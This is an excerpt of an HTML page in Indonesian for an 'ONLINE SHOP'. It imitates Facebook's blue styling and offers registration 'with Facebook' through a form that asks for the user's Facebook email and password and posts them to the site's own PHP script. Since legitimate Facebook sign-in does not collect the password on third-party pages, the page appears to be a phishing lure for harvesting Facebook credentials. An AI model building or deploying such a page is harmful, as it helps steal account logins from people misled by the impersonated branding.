...
<body>
  ...
  <div class="phone-frame">
    ...
    <div class="header animate-slide-down" style="background: linear-gradient(180deg, #3b5998, #2e4482);">
      ...
      <h1>ONLINE SHOP</h1>
      <p>Daftar menggunakan akun Facebook</p>
    </div>

    <!-- Form Facebook Register -->
    <div class="login-box animate-fade-in">
      <h2>DAFTAR DENGAN FACEBOOK</h2>

      <form action="proses_daftar.php" method="POST">
        <input type="email" name="email" placeholder="Masukkan Email Facebook" required>
        <input type="password" name="password" placeholder="Masukkan Password" required>
        <input type="password" name="konfirmasi" placeholder="Konfirmasi Password" required>
        <button type="submit" style="background-color: #3b5998;">Selesai</button>
      </form>
